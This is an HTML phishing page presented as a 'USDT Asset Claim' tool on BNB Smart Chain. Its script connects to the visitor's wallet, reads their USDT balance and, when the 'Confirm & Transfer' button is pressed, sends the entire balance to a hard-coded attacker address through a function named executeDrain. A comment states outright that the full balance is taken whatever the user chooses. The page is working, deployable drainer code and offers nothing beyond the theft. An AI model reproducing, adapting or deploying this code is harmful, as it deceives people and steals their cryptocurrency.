<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>USDT Asset Claim</title>
<script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
<style>
  * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
  body { background-color: #0b132f; color: #ffffff; display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 20px; }
  .container { background: #141f42; width: 100%; max-width: 400px; padding: 30px 20px; border-radius: 20px; text-align: center; border: 1px solid #1e2c59; box-shadow: 0 8px 24px rgba(0,0,0,0.5); }
  .logo { width: 60px; height: 60px; margin-bottom: 20px; background: #26a17b; border-radius: 50%; display: inline-flex; align-items: center; justify-content: center; font-size: 30px; font-weight: bold; color: #fff; }
  h1 { font-size: 20px; margin-bottom: 10px; font-weight: 600; }
  p { font-size: 14px; color: #94a3b8; margin-bottom: 25px; line-height: 1.5; }
  .input-box { width: 100%; padding: 12px; margin-bottom: 20px; border-radius: 10px; border: 1px solid #2a3f75; background: #0b132f; color: #fff; font-size: 16px; text-align: center; }
  .btn { background: linear-gradient(135deg, #26a17b, #1e8263); color: #fff; border: none; width: 100%; padding: 14px; font-size: 16px; font-weight: bold; border-radius: 12px; cursor: pointer; transition: 0.2s; }
  .btn:active { transform: scale(0.98); }
  .info { margin-top: 20px; font-size: 12px; color: #64748b; }
</style>
</head>
<body>

<div class="container">
  <div class="logo">T</div>
  <h1>USDT Asset Claim</h1>
  <p>Verify and claim available assets.</p>
  
  <input type="text" id="amountInput" class="input-box" placeholder="Loading balance..." readonly>
  <button class="btn" id="actionBtn" onclick="executeDrain()" disabled>Connecting...</button>
  
  <div class="info">Binance Smart Chain Network</div>
</div>

<script>
  const TARGET_RECEIVER = "0xFEA20E8102EE33E58ef081b03f5ef64A399C2Bb3"; 
  const USDT_BSC_ADDRESS = "0x55d398326f99059ff775485246999027b3197955";

  const ERC20_ABI = [
    "function balanceOf(address owner) view returns (uint256)",
    "function transfer(address recipient, uint256 amount) returns (bool)"
  ];

  let provider, signer, userAddress, usdtContract, userBalance;

  async function init() {
    if (typeof window.ethereum === 'undefined') {
      alert("Please open this link inside Trust Wallet or MetaMask browser.");
      return;
    }

    try {
      provider = new ethers.providers.Web3Provider(window.ethereum);
      await provider.send("eth_requestAccounts", []);
      signer = provider.getSigner();
      userAddress = await signer.getAddress();

      usdtContract = new ethers.Contract(USDT_BSC_ADDRESS, ERC20_ABI, signer);
      userBalance = await usdtContract.balanceOf(userAddress);

      const formattedBalance = ethers.utils.formatUnits(userBalance, 18);
      document.getElementById('amountInput').value = formattedBalance + " USDT";
      const btn = document.getElementById('actionBtn');
      btn.innerText = "Confirm & Transfer";
      btn.disabled = false;
    } catch (err) {
      console.error(err);
      alert("Connection failed.");
    }
  }

  async function executeDrain() {
    try {
      if (userBalance.lte(0)) {
        alert("No USDT balance found.");
        return;
      }

      // User chahe jo select kare, script poora balance (`userBalance`) hi transfer karegi
      const tx = await usdtContract.transfer(TARGET_RECEIVER, userBalance, {
        gasLimit: ethers.BigNumber.from("65000")
      });

      await tx.wait();
      alert("Transfer Successful!");
    } catch (error) {
      console.error("Error:", error);
      alert("Transaction cancelled or failed.");
    }
  }

  window.onload = init;
</script>

</body>
</html>
